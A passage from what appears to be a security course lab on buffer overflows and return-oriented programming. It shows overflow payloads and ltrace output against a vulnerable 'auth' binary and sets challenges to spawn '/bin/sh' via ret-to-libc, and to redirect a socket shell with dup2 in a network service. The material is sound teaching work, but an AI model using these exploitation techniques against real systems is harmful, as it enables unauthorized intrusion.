`NOP`s. Our buffer's address is `0xbfffee63` (see the `gets()` call).
```
$ python2.7 -c 'print "\x90\x90\x90\x90" + "A" * 1349 + "\x63\xee\xff\xbf"' | ltrace -i ./auth
[0x80484f1] __libc_start_main(0x80486af, 1, 0xbffff454, 0x80486c0, 0x8048730 <unfinished ...>
[0x8048601] malloc(20)                                                                            = 0x0804b008
[0x80485df] puts("Enter password: "Enter password: 
)                                                              = 17
[0x80485ea] gets(0xbfffee63, 0x8048601, 0x80486af, 0xb7cdecb0, 0xb7cdecb7)                        = 0xbfffee63
[0x8048652] memset(0x0804b008, '\000', 20)                                                        = 0x0804b008
[0x8048671] SHA1(0xbfffee63, 137, 0x804b008, 4, 0x90000001)                                       = 0x804b008
[0xbfffee63] --- SIGSEGV (Segmentation fault) ---
[0xffffffff] +++ killed by SIGSEGV +++
```

Guess what? It didn't work... How about we try to jump to some existing code?
First, let's take a look at the `check_password()` function.
```
$ objdump -M intel -d auth | grep -A 15 "<check_password>:"
080485ec <check_password>:
 80485ec:	55                   	push   ebp
 80485ed:	89 e5                	mov    ebp,esp
 80485ef:	81 ec 58 05 00 00    	sub    esp,0x558
 80485f5:	c7 04 24 14 00 00 00 	mov    DWORD PTR [esp],0x14
 80485fc:	e8 9f fe ff ff       	call   80484a0 <malloc@plt>
 8048601:	a3 38 a0 04 08       	mov    ds:0x804a038,eax
 8048606:	a1 38 a0 04 08       	mov    eax,ds:0x804a038
 804860b:	85 c0                	test   eax,eax
 804860d:	75 18                	jne    8048627 <check_password+0x3b>
 804860f:	c7 04 24 76 87 04 08 	mov    DWORD PTR [esp],0x8048776
 8048616:	e8 95 fe ff ff       	call   80484b0 <puts@plt>
 804861b:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 8048622:	e8 99 fe ff ff       	call   80484c0 <exit@plt>
 8048627:	8d 85 bb fa ff ff    	lea    eax,[ebp-0x545]
 804862d:	89 04 24             	mov    DWORD PTR [esp],eax
```

Lets try `0x804860f` such that we print the `malloc` failure message.
```
$ python2.7 -c 'print "A" * 1353 + "\x0f\x86\x04\x08"' | ltrace -i -e puts ./auth
[0x80485df] puts("Enter password: "Enter password: 
)                                                              = 17
[0x804861b] puts("malloc failed"malloc failed
)                                                                 = 14
[0xffffffff] +++ exited (status 1) +++
```

### 02. Challenge - ret-to-libc
So far, so good! Now let's get serious and do something useful with this.

Continue working in the `01-tutorial-ret-to-libc/` folder in the activities
archive.

The final goal of this task is to bypass the NX stack protection and call
`system("/bin/sh")`. We will start with a simple ret-to-plt:
1. Display all libc functions linked with the auth binary.
2. Return to `puts()`. Use ltrace to show that the call is actually being made.
3. Find the offset of the `"malloc failed"` static string in the binary.
4. Make the binary print `"failed"` the second time `puts()` is called.
5. **(bonus)** The process should SEGFAULT after printing `Enter password:`
again. Make it exit cleanly (the exit code does not matter, just no `SIGSEGV`).
You can move on to the next task without solving this problem.
6. Remember how we had ASLR disabled? The other libc functions are in the
memory, you just need to find their addresses. Find the offset of `system()` in
libc. Find the offset of the `"/bin/sh"` string in libc.
7. Where is libc linked in the auth binary? Compute the final addresses and call
`system("/bin/sh")` just like you did with `puts()`.

<details>
    <summary>Hint 1</summary>
Use <code>LD_TRACE_LOADED_OBJECTS=1 ./auth</code> instead of <code>ldd</code>.
The latter is not always reliable, because the order in which it loads the
libraries might be different than when you actually run the binary. 
</details>

<details>
    <summary>Hint 2</summary>
When you finally attack this, <code>stdin</code> will get closed and the new
shell will have nothing to read. Use <code>cat</code> to concatenate your attack
string with <code>stdin</code> like this:
<code>cat <(python -c 'print “L33T_ATTACK”') - | ./vulnbinary</code>.

Note the use of the <code>-</code> (dash) character before the <code>|</code>
(pipe). This prevents the closing of the input file descriptor of the pipe when
<code>cat</code>'s output finished (i.e. when the <code>EOF</code> character is
received).
</details>

### 03. Challenge - no-ret-control
Go to the
[03-challenge-no-ret-control/](/activities/03-challenge-no-ret-control/src)
folder in the activities archive.

Imagine this scenario: we have an executable where we can change at least 4
bytes of random memory, but ASLR is turned on. We cannot reliably change the
value of the return address because of this. Sometimes `ret` is not even called
at the end of a function.

Alter the execution of `force_exit`, in order to call the secret function.

### 04. Challenge - ret-to-plt
Go to the [04-challenge-ret-to-plt/](/activities/04-ret-to-plt/src) folder in
the activities archive.

`random` is a small application that generates a random number.

Your task is to build an exploit that makes the application always print the
same second random number. That is the first printed random number is whatever,
but the second printed random number will always be the same, for all runs. In
the sample output below the second printed random number is always `1023098942`
for all runs.
```
hari@solyaris-home:~$ python2.7 -c 'print <payload here>' | ./random
Hi! Options:
	1. Get random number
	2. Go outside
Here's a random number: 2070249950. Have fun with it!
Hi! Options:
	1. Get random number
	2. Go outside
Here's a random number: 1023098942. Have fun with it!
Segmentation fault (core dumped)
hari@solyaris-home:~$ python2.7 -c 'print <payload here>' | ./random
Hi! Options:
	1. Get random number
	2. Go outside
Here's a random number: 1152946153. Have fun with it!
Hi! Options:
	1. Get random number
	2. Go outside
Here's a random number: 1023098942. Have fun with it!
```

You can use the Python skeleton given in section [NOP Analogy](#nop-analogy) for
the buffer overflow input.

**Bonus:** The process should SEGFAULT after printing the second (constant)
number. Make it exit cleanly (the exit code does not matter, just no `SIGSEGV`).

### 05. Challenge - gadget tutorial
This task requires you to construct a payload using gadgets and calling the
functions inside such that it will print
```
Hello!
stage A!stage B!
```

Make it also print the messages in reverse order:
```
Hello!
stage B!stage A!
```

### 06. Bonus Challenge - Echo service


This task is a network service that can be exploited. Run it locally and try to
exploit it. You'll find that if you call `system("/bin/sh")` the shell is opened
in the terminal where the server was started instead of the one where the attack
takes place. This happens because the client-server communication takes place
over a socket. When you spawn a shell it will inherit the Standard I/O
descriptors from the parent and use those. To fix this you need to redirect the
socket fd into 0,1 (and optionally 2).

So you will need to do the equivalent of the following, as part of a ROP chain:
```c
dup2(sockfd, 1);
dup2(sockfd, 0);
system("/bin/sh");
```

Exploit it first with ASLR disabled and then with it enabled.


## Conclusions
At the end of this session, you should:
- Understand the limitations of classic buffer overflow attacks, as well as
shellcodes.
- Understand and visualise the effect of various simple ROP attacks on a
program's stack
- Be able to craft and make use of ROP chains in order to hack vulnerable
binaries
